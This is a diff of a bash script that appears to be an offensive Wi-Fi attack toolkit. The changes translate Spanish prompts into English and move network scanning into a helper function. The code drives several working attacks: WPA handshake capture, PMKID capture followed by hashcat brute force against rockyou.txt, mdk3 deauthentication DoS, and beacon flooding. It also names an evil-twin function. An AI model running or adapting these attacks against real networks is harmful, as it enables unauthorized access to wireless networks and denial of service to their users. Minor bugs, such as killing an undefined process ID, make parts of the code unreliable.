@@ -156,15 +156,10 @@ updatepackages() {
 	fi
 
 }
-# 1) ataque
-handshake_ataque() {
-	clear
-	echo -e "\n${turquoiseColour}[*]$grayColour Starting Handshake attack"; clear
-	sleep 1
- 	tput cnorm
-   	xterm -e "airodump-ng -w /tmp/xtermNeT --output-format csv ${tar}" &
+ntwk() {
+	xterm -e "airodump-ng -w /tmp/xtermNeT --output-format csv ${tar}" &
 	xtermnet=$!
-	sleep 0.5; kill -9 $xtermnet; wait $xtermnet 2>/dev/null
+	sleep 1; kill -9 $xtermnet; wait $xtermnet 2>/dev/null
 	echo -e "${blueColour}->->->->-> Select a network <-<-<-<-<-${endColour}\n\n\n"
 	while IFS= read -r line; do
 		macrepeat=$(grep $line /tmp/xtermNeT-01.csv | wc -l)
@@ -174,7 +169,16 @@ handshake_ataque() {
 	done < <(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1 | sed '/Station/,1d')
 
 	launch_irodump=$(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1,6,4,9,14 | sed 's/,/   /g; /Station/,$d' | sed '$d' | nl -w3 -s "]    " | sed 's/[0-9]/[&/' | sed "s/\[/${rojo}\[${extrojo}/g; s/\]/${rojo}\]${extrojo}/g " | sed 's/WPA2 WPA/WPA2/;s/         -/        -/;s/        -/            -/;s/[0-9][0-9][0-9]    /&-/;s/    -W/   W/g;s/    -        -/           -/g;s/WEP    /WEP     /;s/WEP      /WEP     /; s/WPA    /WPA     /;s/WPA      /WPA     / ; s/OPN    /OPN     /; s/OPN      /OPN     /; s/    $/    (Hidden Wifi)/; s/ -1    (/ -1     (/;s/    ++/    /; s/    +/    /;s/+//g')
-	echo -e "               Bssid          CH    Encry   PWR       Essid\n----------------------------------------------------------------------\n$launch_irodump"
+	echo -e "               Bssid          CH    Encry    PWR       Essid\n----------------------------------------------------------------------\n$launch_irodump"
+}
+
+handshake_ataque() {
+	clear
+	echo -e "\n${turquoiseColour}[*]$grayColour Starting Handshake attack"
+	clear
+	sleep 1
+ 	tput cnorm
+    ntwk
 	echo -ne "\n$greenColour[?]$grayColour Select a network (Essid or Bssid): " && read ap
 	echo -ne "${greenColour}[?]$grayColour What channel is ${ap}?: " && read channel
 	tput civis
@@ -225,27 +229,27 @@ pkmid_ataque() {
 	clear
 	echo -e "\n${greenColour}[*]$grayColour Starting PMKID attack...\n"
 	sleep 1 
-	echo -e "${blueColour}[!]$grayColour Recomendacion: 600 segundos (10 minutos)"
-	echo -ne "$purpleColour[?]$grayColour Cuantos segundos quieres que dure la captura de los paquetes?: " && read seg
+	echo -e "${blueColour}[!]$grayColour Recommendation: 600 seconds (10 minutes)"
+	echo -ne "$purpleColour[?]$grayColour How many seconds do you want the packet capture to last?: " && read seg
 	$cleancolor
-	xterm -hold -e "hcxdumptool -i $tar -o Captura --active_beacon --enable_status=15" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
+	xterm -hold -e "hcxdumptool -i $tar -o Capture --active_beacon --enable_status=15" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
 	hcxdumptool_PID=$!
 	sleep ${seg}; kill -9 $hcxdumptool_PID; wait $hcxdumptool_PID 2>/dev/null
-    echo -e "\n${redColour}[%]$grayColour Capturando Hashes\n"
-	hcxcaptool -z HASHPMKID Captura; sudo rm Captura 2>/dev/null
+    echo -e "\n${redColour}[%]$grayColour Capturing packages\n"
+	hcxcaptool -z HASHPMKID Capture; sudo rm Capture 2>/dev/null
 	sleep 1
 	$cleancolor
 	test -f HASHPMKID*
 	if [ "$(echo $?)" -eq 0 ]; then
-		echo -e "\n${yellowColour}[*]$grayColour Iniciando ataque de fuerza bruta"
+		echo -e "\n${yellowColour}[*]$grayColour Initiating brute force attack"
 		sleep 1
 		tput cnorm
-		echo -e "\n${blueColour}[*]$grayColour Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
-		echo -ne "${greenColour}[?]$grayColour Ruta del Diccionario al usar: " && read dicc1
-		tput civis; echo -e "\n${yellowColour}[*] Preparando el paquete para hacer fuerza bruta..."
+		echo -e "\n${blueColour}[*]$grayColour Path to rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
+		echo -ne "${greenColour}[?]$grayColour Dictionary path to use: " && read dicc1
+		tput civis; echo -e "\n${yellowColour}[*] Preparing the package for brute force..."
 		hashcat -m 16800 $dicc1 HASHPMKID -d 1 --force
 	else 
-		echo -e "\n${redColour}[!]$grayColour No se pudo capturar el paquete necesario"
+		echo -e "\n${redColour}[!]$grayColour The required package could not be captured"
 		sleep 2
 	fi
 }
@@ -338,7 +342,7 @@ menunomon() {
 	clear; echo -e "${yellowColour}\n1) Force Brute menu"
 	echo -e "2) Scanner "
 	echo -e "3) Exit"
-	echo -ne "${yellowColour}[*]$grayColour Attack: " && read force
+	echo -ne "\n${yellowColour}[?]$grayColour Attack: " && read force
 	case $force in 
 	1)
 	menuforce
@@ -466,19 +470,18 @@ eviltrust() {
 }
 dosattack() {
 	clear; echo -e "\n${blueColourColour}[*]$grayColour Starting DoS attack..."; sleep 2
-	xterm -hold -e "airodump-ng $tar" &
-	dosairdump_PID=$!
-	echo -ne "${purpleColour}[?]$grayColour Cual red deseas atacar?: " && read redos
+	ntwk
+	echo -ne "\n$greenColour[?]$grayColour Select a network (Essid or Bssid): " && read redos
 	kill -9 $dosairdump_PID; wait $dosairdump_PID 2>/dev/null
-	echo -ne "${redColour}[?]$grayColour Canales para el ataque Dos (1,6,11): " && read canalesdos
+	echo -ne "${redColour}[?]$grayColourChannels Channels for attack (Recommend 1,6,11): " && read canalesdos
 	xterm -hold -e "sudo mdk3 $tar d -a $redos -c $canalesdos"
 }
 
 beaconflood() {
 	clear; echo -e "\n${purpleColour}[*]$grayColour Starting Beacon Flood attack..."; sleep 2
-	echo -ne "\n${blueColour}[?]$grayColour Quieres ponerle un nombre a las redes? [Y/N]: " && read rpsbeacon 
+	echo -ne "\n${blueColour}[?]$grayColourYou Want to name the networks (Recommend (N) )? [Y/N]: " && read rpsbeacon 
 	if [ "$rpsbeacon" == "y" ] || [ "$rpsbeacon" == "Y" ]; then
-		echo -ne "${yelloColour}[?]$grayColour Nombre: " && read nameap
+		echo -ne "${yelloColour}[?]$grayColour Name: " && read nameap
 			xterm -hold -e "sudo mdk3 $tar b -n $nameap -s 1000"
 	elif [ "$rpsbeacon" == "n" ] || [ "$rpsbeacon" == "N" ]; then
 		xterm -hold -e "sudo mdk3 $tar b -s 1000"
